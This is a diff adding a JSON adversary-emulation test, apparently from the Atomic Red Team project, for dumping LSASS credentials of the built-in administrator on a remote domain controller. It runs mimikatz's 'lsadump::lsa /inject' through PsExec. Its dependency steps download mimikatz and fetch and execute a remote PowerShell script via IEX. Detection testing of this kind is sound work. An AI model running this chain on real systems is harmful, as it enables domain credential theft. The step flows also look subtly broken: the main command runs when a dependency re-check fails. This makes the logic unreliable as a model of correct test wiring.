@@ -1,0 +1,151 @@
+{
+  "id": "3203ad24-168e-4bec-be36-f79b13ef8a83",
+  "name": "Remote Process Injection in LSASS via mimikatz",
+  "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in \u003chttps://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html\u003e\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "4fd8b37a-4830-486f-9283-3336b43930b8",
+      "type": "execute-command",
+      "data": {
+        "command": "\"#{psexec_path}\" /accepteula \\\\#{machine} -c #{mimikatz_path} \"lsadump::lsa /inject /id:500\" \"exit\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d0318cdc-24b9-4e67-b79b-bd32a0e5354e",
+      "name": "Check dependency 1/2",
+      "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "4b073585-1ca2-4567-b3f0-d0e8a2bdda19",
+      "name": "Resolve dependency 1/2",
+      "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b57a0fb5-ca66-4d92-a113-fe0e1a93ba98",
+      "name": "Re-check dependency 1/2",
+      "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "6597090a-79bf-435a-974c-bc37543d3b10",
+      "name": "Check dependency 2/2",
+      "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "121c0253-cd0d-41f1-bd91-fe0f8ee2199d",
+      "name": "Resolve dependency 2/2",
+      "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" -UseBasicParsing\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{psexec_path}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"#{psexec_path}\" -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "80aae608-f884-409f-8706-87c3d70192e0",
+      "name": "Re-check dependency 2/2",
+      "description": "PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{psexec_path}\") { exit 0} else { exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "d0318cdc-24b9-4e67-b79b-bd32a0e5354e",
+      "p": "on-success",
+      "o": "4fd8b37a-4830-486f-9283-3336b43930b8"
+    },
+    {
+      "s": "d0318cdc-24b9-4e67-b79b-bd32a0e5354e",
+      "p": "on-failure",
+      "o": "4b073585-1ca2-4567-b3f0-d0e8a2bdda19"
+    },
+    {
+      "s": "4b073585-1ca2-4567-b3f0-d0e8a2bdda19",
+      "p": "on-success",
+      "o": "b57a0fb5-ca66-4d92-a113-fe0e1a93ba98"
+    },
+    {
+      "s": "b57a0fb5-ca66-4d92-a113-fe0e1a93ba98",
+      "p": "on-failure",
+      "o": "4fd8b37a-4830-486f-9283-3336b43930b8"
+    },
+    {
+      "s": "6597090a-79bf-435a-974c-bc37543d3b10",
+      "p": "on-success",
+      "o": "4fd8b37a-4830-486f-9283-3336b43930b8"
+    },
+    {
+      "s": "6597090a-79bf-435a-974c-bc37543d3b10",
+      "p": "on-failure",
+      "o": "121c0253-cd0d-41f1-bd91-fe0f8ee2199d"
+    },
+    {
+      "s": "121c0253-cd0d-41f1-bd91-fe0f8ee2199d",
+      "p": "on-success",
+      "o": "80aae608-f884-409f-8706-87c3d70192e0"
+    },
+    {
+      "s": "80aae608-f884-409f-8706-87c3d70192e0",
+      "p": "on-failure",
+      "o": "4fd8b37a-4830-486f-9283-3336b43930b8"
+    }
+  ],
+  "tags": [
+    "T1055",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "psexec_path",
+      "type": "string",
+      "description": "Path to PsExec",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe"
+    },
+    {
+      "name": "machine",
+      "type": "string",
+      "description": "machine to target (via psexec)",
+      "value": "DC1"
+    },
+    {
+      "name": "mimikatz_path",
+      "type": "path",
+      "description": "Mimikatz windows executable",
+      "value": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+    }
+  ]
+}
